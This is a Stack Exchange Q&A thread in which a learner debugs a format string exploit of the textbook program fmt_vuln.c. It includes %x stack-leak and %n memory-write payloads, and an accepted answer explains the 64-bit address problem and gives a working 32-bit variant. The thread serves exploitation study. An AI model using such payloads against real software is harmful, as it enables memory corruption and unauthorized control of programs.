{
    "title": "Unable to exploit format string vulenrability on Ubuntu 18.04.2 LTS",
    "link": "https://reverseengineering.stackexchange.com/questions/21765/unable-to-exploit-format-string-vulenrability-on-ubuntu-18-04-2-lts",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am studying from \"Hacking: The Art of Exploitation\" and in program\n  <a href=\"https://github.com/intere/hacking/blob/master/booksrc/fmt_vuln.c\" rel=\"nofollow noreferrer\">\n   fmt_vuln.c\n  </a>\n  format string is exploited. I am getting\n  <code>\n   Segmentation Fault\n  </code>\n  error.\n </p>\n <p>\n  Checking position of\n  <code>\n   AAAA\n  </code>\n  on stack:\n </p>\n <pre><code>$ ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe right way to print user-controlled input:\nAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe wrong way to print user-controlled input:\nAAAA55756260.f7dd18c0.f7af4154.00000000.f7b523a0.ffffdfe8.ffffdb30.41414141\n[*] test_val @ 0x555555755010 = -72 0xffffffb8\n</code></pre>\n <p>\n  Witing to\n  <code>\n   test_value\n  </code>\n  address\n </p>\n <pre><code>$ ./fmt_vuln $(printf \"\\x10\\x50\\x75\\x55\")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe right way to print user-controlled input:\n\u0010PuU%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe wrong way to print user-controlled input:\nSegmentation fault (core dumped)\n</code></pre>\n <p>\n  As suggested in\n  <a href=\"https://stackoverflow.com/a/27214598/6810253\">\n   this answer\n  </a>\n  I have disabled ASLR and compiled without stack protection.\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 2,
    "views": "313",
    "tags": [
        "linux",
        "c",
        "exploit"
    ],
    "user": "coder",
    "time": "Jul 25, 2019 at 7:50",
    "comments": [
        {
            "user": "Ricardo",
            "text": "<html><body><span class=\"comment-copy\">\n Maybe stack canaries?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Chris Stratton",
            "text": "<html><body><span class=\"comment-copy\">\n Questions on Stack Exchange sites must stand on their own; as this is in effect a debugging question it must include the actual code directly, not as a link.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  As @Chris Stratton already said, you don't give the right pointer value - you want to put\n  <code>\n   \\x10\\x50\\x75\\x55\\x55\\x55\\x00\\x00\n  </code>\n  as that value. Your segfault comes from instruction:\n </p>\n <pre><code>mov dword [rax], r13d\n</code></pre>\n <p>\n  where\n  <code>\n   rax\n  </code>\n  =\n  <code>\n   0x7838302555755010\n  </code>\n  , which confirms that you need to put these\n  <code>\n   4\n  </code>\n  extra bytes (to overwrite\n  <code>\n   78383025\n  </code>\n  part). I do not know however how you can pass\n  <code>\n   NULL\n  </code>\n  bytes in bash as an argument.\n </p>\n <p>\n  As a workaround, you can compile this program for\n  <code>\n   32\n  </code>\n  bit architecture using\n  <code>\n   -m32\n  </code>\n  option in GCC. Then use:\n </p>\n <pre><code>./fmt_vuln AAAA%08x.%08x.%08x.%08x\n</code></pre>\n <p>\n  to get:\n </p>\n <pre><code>[*] test_val @ 0x56557008 = -72 0xffffffb8\n</code></pre>\n <p>\n  and then:\n </p>\n <pre><code>./fmt_vuln $(printf \"\\x08\\x70\\x55\\x56\")%08x.%08x.%08x.%n\n</code></pre>\n <p>\n  and finally you get:\n </p>\n <pre><code>[*] test_val @ 0x56557008 = 31 0x0000001f\n</code></pre>\n <p>\n  <strong>\n   Note:\n  </strong>\n  when in doubt, just run your program in a debugger (I used\n  <a href=\"https://rada.re/r/\" rel=\"nofollow noreferrer\">\n   radare2\n  </a>\n  for instance) - this way you can get the instruction causing segfault and you can see register values at that moment.\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "bart1e",
            "time": "Jul 26, 2019 at 20:24",
            "is_accepted": true,
            "comments": []
        },
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <blockquote>\n  <p>\n   [*] test_val @ 0x555555755010 = -72 0xffffffb8\n  </p>\n </blockquote>\n <p>\n  This shows us that you are on a 64 bit system.\n </p>\n <blockquote>\n  <p>\n   $ ./fmt_vuln $(printf \"\\x10\\x50\\x75\\x55\")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\n  </p>\n </blockquote>\n <p>\n  Yet you attempt to supply only the low 32-bits as your pointer value.  Whatever the value of the other 32-bits, they are overwhelmingly likely to be part of an invalid address.\n </p>\n <p>\n  This may not be the only thing wrong, but by itself it is a clear mistake.\n </p>\n</div>\n</body></html>",
            "votes": "0",
            "user": "Chris Stratton",
            "time": "Jul 26, 2019 at 18:55",
            "is_accepted": false,
            "comments": []
        }
    ]
}